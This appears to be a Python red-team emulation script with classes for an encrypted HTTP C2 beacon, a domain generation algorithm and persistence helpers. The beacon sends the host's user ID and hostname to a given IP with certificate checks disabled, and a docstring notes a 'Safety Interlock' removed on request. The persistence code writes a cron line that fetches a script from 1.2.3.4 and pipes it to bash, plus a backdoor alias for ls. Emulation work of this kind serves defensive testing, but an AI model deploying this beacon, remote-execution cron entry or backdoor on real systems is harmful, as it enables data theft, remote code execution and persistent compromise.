#!/usr/bin/env python3
"""
Red Team Tools
Advanced Emulation Capabilities: HTTP/S Traffic Gen, DGA, Persistence
"""

import os
import random
import time
import socket
import urllib.request
import urllib.parse
import base64
import string
import logging
import json
import ssl
from c2_crypto import c2_crypto

class TrafficGenerator:
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "curl/7.68.0",
        "Wget/1.20.3 (linux-gnu)"
    ]

    def _generate_payload(self, size=64):
        """Generates Encrypted C2 Payload."""
        # Genuine data structure
        data = {
            "uid": os.getuid() if hasattr(os, 'getuid') else 0,
            "host": socket.gethostname(),
            "nonce": random.randint(1000,9999),
            "padding": "A" * size
        }
        # ENCRYPTED PAYLOAD
        return c2_crypto.encrypt(data)

    def send_http_beacon(self, ip, port=443):
        """
        Emulates a SECURE HTTP BEACON (HTTPS + Auth + Encryption).
        Removes 'Safety Interlock' as requested.
        """
        try:
            # Enforce HTTPS port if 443, else use http for random ports (or try upgrade)
            proto = "https" if port == 443 else "http"
            url = f"{proto}://{ip}:{port}/api/v1/secure/status"

            encrypted_body = self._generate_payload()

            req = urllib.request.Request(url, data=encrypted_body.encode('utf-8'))
            req.add_header('User-Agent', random.choice(self.USER_AGENTS))
            req.add_header('Content-Type', 'application/octet-stream')

            # SECURE AUTH HEADER
            req.add_header('X-Auth-Token', 'eccd0a33-2892-4916-924b-008323498871') # Shared Secret

            # Create a context that doesn't verify certs (emulating malware ignoring self-signed)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            # Real outbound connection attempt
            with urllib.request.urlopen(req, timeout=3, context=ctx) as r:
                return r.status

        except (urllib.error.URLError, socket.timeout, ConnectionRefusedError):
            # Expected failure when hitting arbitrary bad IPs
            return 0
        except Exception as e:
            logging.error(f"Beacon Error: {e}")
            return 0

class DGA:
    """Domain Generation Algorithm Emulation"""
    def generate_domain(self):
        tld = random.choice(['.com', '.net', '.org', '.info', '.biz'])
        length = random.randint(8, 20)
        domain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + tld
        return domain

    def resolve_domain(self, domain):
        try:
            socket.gethostbyname(domain)
            return True
        except socket.gaierror:
            return False

class PersistenceManager:
    def install_cron(self):
        try:
            with open("/tmp/malicious.cron", "w") as f:
                f.write("* * * * * /bin/bash -c 'curl -k https://1.2.3.4/run | bash'\n")
            return True
        except: return False

    def install_bashrc(self):
        target = "/tmp/.bashrc_backdoor"
        try:
            with open(target, "w") as f:
                f.write("alias ls='ls --color=auto; /tmp/malware &'\n")
            return True
        except: return False

if __name__ == "__main__":
    t = TrafficGenerator()
    # print(t.send_http_beacon("127.0.0.1"))
